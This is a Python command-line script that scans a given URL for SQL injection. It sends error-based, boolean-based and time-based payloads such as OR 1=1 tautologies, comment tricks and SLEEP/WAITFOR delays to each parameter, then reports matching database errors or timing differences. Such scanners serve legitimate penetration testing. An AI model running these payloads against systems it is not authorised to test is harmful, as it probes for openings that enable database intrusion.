#!/usr/bin/env python3
"""
SQL Injection Tester
Tests for SQL injection vulnerabilities
"""

import requests
import urllib.parse
import json
import time
import re
from datetime import datetime
from bs4 import BeautifulSoup

class SQLiTester:
    """SQL Injection vulnerability tester"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

        # SQL injection payloads
        self.error_payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "') OR ('1'='1",
            "') OR ('1'='1' --",
            "1' OR '1'='1",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' or 1=1--",
            "' or 1=1#",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
        ]

        self.boolean_payloads = [
            ("' AND '1'='1", "' AND '1'='2"),  # (true, false)
            ("' OR '1'='1", "' AND '1'='2"),
            (" AND 1=1", " AND 1=2"),
            ("' AND 'a'='a", "' AND 'a'='b"),
        ]

        self.time_payloads = [
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT SLEEP(5)--",
            "'; pg_sleep(5)--",
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "1' AND SLEEP(5)#",
            "1 AND SLEEP(5)",
            "1' WAITFOR DELAY '0:0:5'--",
        ]

        # SQL error patterns
        self.error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB) server version",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Driver.* SQL[\-\_\ ]*Server",
            r"OLE DB.* SQL Server",
            r"SQLServer JDBC Driver",
            r"SqlException",
            r"Microsoft SQL Native Client",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            r"quoted string not properly terminated",
            r"SQL command not properly ended",
            r"sqlite3.OperationalError:",
            r"SQLite/JDBCDriver",
            r"System.Data.SQLite.SQLiteException",
            r"mysql_fetch",
            r"supplied argument is not a valid MySQL",
            r"mysqli",
            r"sqlalchemy",
        ]

    def scan(self):
        """Run SQL injection scan"""
        print(f"[*] Starting SQLi scan on {self.target_url}")

        # Get baseline response
        self.baseline_response = self._get_baseline()

        # Test error-based SQLi
        self._test_error_based()

        # Test boolean-based SQLi
        self._test_boolean_based()

        # Test time-based SQLi
        self._test_time_based()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _get_baseline(self):
        """Get baseline response for comparison"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            return {
                'status': response.status_code,
                'length': len(response.text),
                'time': response.elapsed.total_seconds(),
                'text': response.text
            }
        except Exception as e:
            print(f"[!] Error getting baseline: {e}")
            return None

    def _test_error_based(self):
        """Test for error-based SQL injection"""
        print("[*] Testing error-based SQLi...")

        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            params = {'id': ['1']}

        for param_name in params.keys():
            for payload in self.error_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]

                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

                try:
                    response = self.session.get(test_url, timeout=10)

                    # Check for SQL error messages
                    for pattern in self.error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vuln = {
                                'type': 'SQL Injection',
                                'subtype': 'Error-based',
                                'severity': 'critical',
                                'url': test_url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': f'SQL error pattern matched: {pattern}'
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] Error-based SQLi found: {param_name}")
                            return  # Found vulnerability, stop testing this param

                except Exception as e:
                    pass

    def _test_boolean_based(self):
        """Test for boolean-based blind SQL injection"""
        print("[*] Testing boolean-based blind SQLi...")

        if not self.baseline_response:
            return

        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            params = {'id': ['1']}

        for param_name in params.keys():
            for true_payload, false_payload in self.boolean_payloads:
                # Test TRUE payload
                test_params_true = params.copy()
                test_params_true[param_name] = [params[param_name][0] + true_payload]

                query_true = urllib.parse.urlencode(test_params_true, doseq=True)
                test_url_true = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_true}"

                # Test FALSE payload
                test_params_false = params.copy()
                test_params_false[param_name] = [params[param_name][0] + false_payload]

                query_false = urllib.parse.urlencode(test_params_false, doseq=True)
                test_url_false = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_false}"

                try:
                    response_true = self.session.get(test_url_true, timeout=10)
                    response_false = self.session.get(test_url_false, timeout=10)

                    # Compare responses
                    if self._is_different_response(response_true, response_false):
                        # Additional check: true should be similar to baseline
                        if self._is_similar_response(response_true, self.baseline_response):
                            vuln = {
                                'type': 'SQL Injection',
                                'subtype': 'Boolean-based blind',
                                'severity': 'high',
                                'url': self.target_url,
                                'parameter': param_name,
                                'payload_true': true_payload,
                                'payload_false': false_payload,
                                'evidence': 'Different responses for TRUE/FALSE conditions'
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] Boolean-based SQLi found: {param_name}")
                            return

                except Exception as e:
                    pass

    def _test_time_based(self):
        """Test for time-based blind SQL injection"""
        print("[*] Testing time-based blind SQLi...")

        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            params = {'id': ['1']}

        for param_name in params.keys():
            for payload in self.time_payloads:
                test_params = params.copy()
                test_params[param_name] = [params[param_name][0] + payload]

                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

                try:
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=15)
                    elapsed = time.time() - start_time

                    # If response took significantly longer (4+ seconds), likely vulnerable
                    if elapsed >= 4.0:
                        vuln = {
                            'type': 'SQL Injection',
                            'subtype': 'Time-based blind',
                            'severity': 'high',
                            'url': test_url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f'Response delayed by {elapsed:.2f} seconds'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] Time-based SQLi found: {param_name} (delay: {elapsed:.2f}s)")
                        return

                except requests.exceptions.Timeout:
                    # Timeout is also an indicator
                    vuln = {
                        'type': 'SQL Injection',
                        'subtype': 'Time-based blind',
                        'severity': 'high',
                        'url': test_url,
                        'parameter': param_name,
                        'payload': payload,
                        'evidence': 'Request timed out (15s)'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] Time-based SQLi found: {param_name} (timeout)")
                    return
                except Exception as e:
                    pass

    def _is_different_response(self, resp1, resp2):
        """Check if two responses are significantly different"""
        # Compare status codes
        if resp1.status_code != resp2.status_code:
            return True

        # Compare content length (with some tolerance)
        len_diff = abs(len(resp1.text) - len(resp2.text))
        if len_diff > 100:  # Significant difference
            return True

        # Compare key content
        if self._normalize_text(resp1.text) != self._normalize_text(resp2.text):
            return True

        return False

    def _is_similar_response(self, response, baseline):
        """Check if response is similar to baseline"""
        if not baseline:
            return False

        # Status code should match
        if response.status_code != baseline['status']:
            return False

        # Length should be similar (within 10%)
        len_diff = abs(len(response.text) - baseline['length'])
        if len_diff > baseline['length'] * 0.1:
            return False

        return True

    def _normalize_text(self, text):
        """Normalize text for comparison"""
        # Remove dynamic content like timestamps, session IDs
        text = re.sub(r'\d{4}-\d{2}-\d{2}', '', text)
        text = re.sub(r'\d{2}:\d{2}:\d{2}', '', text)
        text = re.sub(r'[a-f0-9]{32}', '', text)  # MD5 hashes
        return text

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 sqli_tester.py <url>")
        sys.exit(1)

    tester = SQLiTester(sys.argv[1])
    results = tester.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Vulnerabilities found: {len(results['vulnerabilities'])}")
